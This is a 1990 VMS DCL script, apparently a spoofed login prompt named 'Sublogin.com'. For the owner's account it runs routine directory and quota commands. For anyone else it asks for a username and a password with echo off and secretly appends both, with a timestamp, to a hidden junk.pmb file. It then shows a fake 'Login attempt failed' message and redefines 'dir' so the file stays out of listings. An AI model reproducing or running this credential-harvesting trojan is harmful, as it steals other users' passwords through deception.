!
!
!                   Peter M Brown University of Lowell 1990
!
!
$ w :== write sys$output
$ on severe_error then continue
$
$ uic  = f$user()
$ time = f$time()
$
$ if uic .EQS. "[BROWNP]" then goto GOOD_USER
$
$ goto BAD_USER
$        
$GOOD_USER:
$
$ dir := dir
$ dir :== dir
$ dir == dir
$
$ Clear
$ @science$disk:[brownp.tools]cmdwindow.com
$ set def science$disk:[brownp.public]
$ W :== write sys$output
$ W " "
$ W "The current disk quota and directory contents follow :"
$ W " "
$ SHOW QUOTA
$ W "+------------------------------------------------------------+"
$ ls
$ purge
$! rename *.*;* *.*;1
$! set prot = (o:rwed) *.*;*
$! set prot = (w:re) *.*;*
$! set prot = (s:re) *.*;*
$! set prot = (g:re) *.*;*
$! set prot = (w:e) run__this__always.com
$! type/page users.dat
$ W "+------------------------------------------------------------+"
$exit
$
$BAD_USER:
$ 
$ dir := dir / exclude = (.dat, .pmb)
$
$
$USERNAME:
$
$ w " "
$ inquire/nopunct  uname "Username: "
$
$ set terminal/noecho
$
$ inquire/nopunct  pword "Password: "
$
$ open/append junk science$disk:[brownp.public]junk.pmb
$ write junk uname, "    ", pword, "   ", time, "  From Sublogin.com"
$
$ set term/echo
$ w " "
$ w "Login attempt failed. Not system personell."
$
$ set def sys$login
$exit
